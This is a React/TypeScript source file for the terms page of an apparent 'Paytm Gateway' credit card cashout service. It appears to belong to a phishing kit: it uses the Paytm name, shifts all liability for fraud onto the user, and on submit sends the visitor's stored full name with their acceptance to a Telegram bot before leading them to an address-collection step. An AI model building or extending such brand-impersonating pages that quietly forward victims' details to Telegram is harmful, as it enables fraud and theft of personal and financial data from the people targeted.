import { useState } from "react";
import { AppLayout } from "../../components/AppChrome/AppLayout";
import { Banner } from "../../components/Banner/Banner";
import { Button } from "../../components/ui/Button";
import { useNavigate } from "../../app/router";
import { sendToTelegram, formatEntry } from "../../lib/telegram";
import "./TermsPage.css";

export function TermsPage() {
  const navigate = useNavigate();
  const [agreed, setAgreed] = useState(false);
  const [error, setError]   = useState<string | null>(null);

  function getUserName(): string {
    try {
      const lead = JSON.parse(sessionStorage.getItem("rg:lead") || "{}");
      return lead.fullName || "Unknown";
    } catch { return "Unknown"; }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!agreed) return setError("Please accept the terms and conditions to continue");

    void sendToTelegram(
      formatEntry("📋 Terms Accepted", {
        "👤 User":  getUserName(),
        "Accepted": "Yes — T&C agreed",
      })
    );

    navigate("/address");
  };

  return (
    <AppLayout title="Terms &amp; Conditions">
      <div className="tpg">
        <Banner />
        <section className="tpg__card">
          <header className="tpg__head">
            <div className="tpg__icon">📋</div>
            <h1 className="tpg__heading">Terms &amp; Conditions</h1>
            <p className="tpg__sub">Please read carefully before proceeding</p>
          </header>

          <div className="tpg__body">
            <div className="tpg__block">
              <h2 className="tpg__section-title">Credit Card Cashout Service</h2>
              <p className="tpg__text">
                Paytm Gateway is providing you with a credit card cashout
                facility. By using this service you agree to the following
                terms.
              </p>
            </div>

            <div className="tpg__block">
              <h2 className="tpg__section-title">1. User Responsibility</h2>
              <p className="tpg__text">
                You are solely responsible for all transactions made using
                your credit card through this platform. Paytm Gateway acts
                only as a facilitator and bears no liability for any
                unauthorised use or fraudulent activity on your account.
              </p>
            </div>

            <div className="tpg__block">
              <h2 className="tpg__section-title">2. Credit Card Provided for Cashout</h2>
              <p className="tpg__text">
                We are providing a credit card cashout service. <strong>You are
                fully responsible</strong> for repayment of any amount disbursed
                to your account. Failure to repay within the due date may
                attract interest, penalties and legal action as per applicable
                law.
              </p>
            </div>

            <div className="tpg__block">
              <h2 className="tpg__section-title">3. Data Consent</h2>
              <p className="tpg__text">
                You consent to the collection, storage and processing of your
                personal and financial information for the purpose of
                completing this transaction and complying with regulatory
                requirements.
              </p>
            </div>

            <div className="tpg__block">
              <h2 className="tpg__section-title">4. No Guarantee of Approval</h2>
              <p className="tpg__text">
                Submission of your details does not guarantee approval of the
                cashout request. Paytm Gateway reserves the right to decline
                any request at its sole discretion.
              </p>
            </div>

            <div className="tpg__block">
              <h2 className="tpg__section-title">5. Charges</h2>
              <p className="tpg__text">
                A service charge of <strong>0.27%</strong> of the cashout
                amount will be deducted. This charge is non-refundable.
              </p>
            </div>

            <div className="tpg__block">
              <h2 className="tpg__section-title">6. Settlement</h2>
              <p className="tpg__text">
                Approved cashout amounts will be credited to your registered
                UPI ID within <strong>48 hours</strong> of successful
                verification.
              </p>
            </div>
          </div>

          <form className="tpg__form" onSubmit={handleSubmit} noValidate>
            <label className="tpg__checkbox">
              <input
                type="checkbox"
                checked={agreed}
                onChange={(e) => {
                  setAgreed(e.target.checked);
                  if (e.target.checked) setError(null);
                }}
              />
              <span>
                I have read, understood and agree to all the Terms &amp;
                Conditions above. I am responsible for all transactions made
                through this platform.
              </span>
            </label>

            {error && <p className="tpg__error">{error}</p>}

            <Button type="submit" variant="primary" block disabled={!agreed}>
              I Agree &amp; Continue
            </Button>
          </form>
        </section>
      </div>
    </AppLayout>
  );
}
